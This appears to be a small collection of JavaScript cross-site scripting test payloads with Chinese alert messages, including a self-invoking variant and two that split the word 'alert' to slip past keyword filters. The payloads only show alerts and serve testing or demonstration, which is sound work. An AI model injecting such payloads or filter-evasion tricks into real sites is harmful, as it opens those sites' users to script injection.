alert('XSS 成功！')
(function(){
  alert('✅ 自我執行的 XSS！');
})();
(window['al'+'ert'])('✅ 混淆版 XSS！');
var x = 'al' + 'ert';
window[x]('✅ 變數混淆 XSS！');
